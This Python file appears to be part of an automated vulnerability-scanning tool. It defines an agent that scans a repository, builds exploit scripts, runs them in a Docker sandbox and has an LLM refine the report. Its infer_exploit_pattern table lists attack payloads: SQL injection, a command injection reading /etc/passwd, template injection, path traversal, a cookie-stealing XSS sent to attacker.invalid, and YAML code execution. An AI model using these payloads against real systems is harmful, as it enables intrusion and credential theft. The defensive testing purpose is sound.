from __future__ import annotations

import asyncio
from pathlib import Path

from vuln_swarm.agents.exploits import build_exploit_script
from vuln_swarm.core.config import Settings
from vuln_swarm.core.llm import GroqJsonClient, LlmUnavailableError
from vuln_swarm.rag.vector_store import ChromaKnowledgeBase
from vuln_swarm.sandbox.docker_runner import DockerSandbox
from vuln_swarm.scanner.static import StaticAnalyzer
from vuln_swarm.schemas import Severity, VulnerabilityReport


class OffensiveSecurityAgent:
    def __init__(
        self,
        *,
        settings: Settings,
        scanner: StaticAnalyzer,
        knowledge_base: ChromaKnowledgeBase,
        sandbox: DockerSandbox,
        llm: GroqJsonClient,
    ):
        self.settings = settings
        self.scanner = scanner
        self.knowledge_base = knowledge_base
        self.sandbox = sandbox
        self.llm = llm

    async def run(
        self,
        *,
        run_id: str,
        repo_path: Path,
        repository: str,
        commit_sha: str | None,
    ) -> VulnerabilityReport:
        vulnerabilities = self.scanner.scan(repo_path)
        for vulnerability in vulnerabilities:
            query = f"{vulnerability.vuln_id} {vulnerability.title} {vulnerability.description}"
            vulnerability.rag_citations = self.knowledge_base.retrieve_bundle(query, top_k=2)[:6]
            vulnerability.exploit_pattern = infer_exploit_pattern(vulnerability.vuln_id)
            vulnerability.exploit_script = build_exploit_script(vulnerability)

        runnable = [
            vulnerability
            for vulnerability in vulnerabilities
            if vulnerability.severity in {Severity.critical, Severity.high} and vulnerability.exploit_script
        ][: self.settings.max_exploit_executions]
        for vulnerability in runnable:
            assert vulnerability.exploit_script is not None
            vulnerability.exploit_result = await asyncio.to_thread(
                self.sandbox.run_exploit,
                run_id=run_id,
                vulnerability_id=vulnerability.id,
                repo_path=repo_path,
                script=vulnerability.exploit_script.script,
                language=vulnerability.exploit_script.language,
            )

        summary = (
            f"Detected {len(vulnerabilities)} candidate vulnerabilities."
            if vulnerabilities
            else "No vulnerabilities detected by static and semantic analysis."
        )
        report = VulnerabilityReport(
            run_id=run_id,
            repository=repository,
            commit_sha=commit_sha,
            vulnerabilities=vulnerabilities,
            summary=summary,
        )
        if self.llm.enabled and vulnerabilities:
            return await self._refine_with_llm(report)
        return report

    async def _refine_with_llm(self, report: VulnerabilityReport) -> VulnerabilityReport:
        try:
            return await self.llm.complete_json(
                system_prompt=(
                    "You are Agent A, an offensive security triage agent. "
                    "Use the supplied static findings, sandbox results, and RAG citations. "
                    "Preserve vulnerability IDs, affected files, and evidence. "
                    "Improve only classification, exploit summaries, and remediation hints when the evidence supports it."
                ),
                user_payload={"vulnerability_report": report.model_dump(mode="json")},
                output_model=VulnerabilityReport,
                schema_name="VulnerabilityReport",
            )
        except (LlmUnavailableError, Exception):
            return report


def infer_exploit_pattern(vuln_id: str) -> str | None:
    return {
        "CP-001": "' OR 1=1 --",
        "CP-002": "; cat /etc/passwd",
        "CP-003": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "CP-004": "../../etc/passwd",
        "CP-005": "<script>document.location='http://attacker.invalid?c='+document.cookie</script>",
        "TRB-001": "__import__('os').system('id')",
        "TRB-002": "!!python/object/apply:os.system ['id']",
        "TRB-003": "crafted pickle __reduce__ payload",
    }.get(vuln_id)
